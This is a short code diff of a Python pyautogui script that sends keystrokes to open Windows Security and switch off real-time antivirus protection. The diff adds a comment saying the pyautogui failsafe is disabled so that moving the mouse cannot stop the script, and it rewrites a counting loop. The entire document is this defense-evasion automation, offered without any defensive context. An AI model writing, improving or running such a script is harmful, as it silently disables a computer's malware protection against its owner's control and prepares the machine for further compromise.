@@ -1,8 +1,8 @@
 import pyautogui as kb
 import time
 
+# Set FAILSAFE to false to prevent the script from being stopped by mouse movement.
 kb.FAILSAFE=False
-counter = 5
 
 # Open search and look for windows security
 kb.press('winleft')
@@ -24,7 +24,6 @@ kb.hotkey('shiftleft', 'space')
 time.sleep(1)
 
 # Navigate to turn off realtime protection
-while counter > 0:
+for x in range(5):
     kb.hotkey('shiftleft', 'tab')
-    counter = counter - 1
 kb.hotkey('shiftleft', 'space')
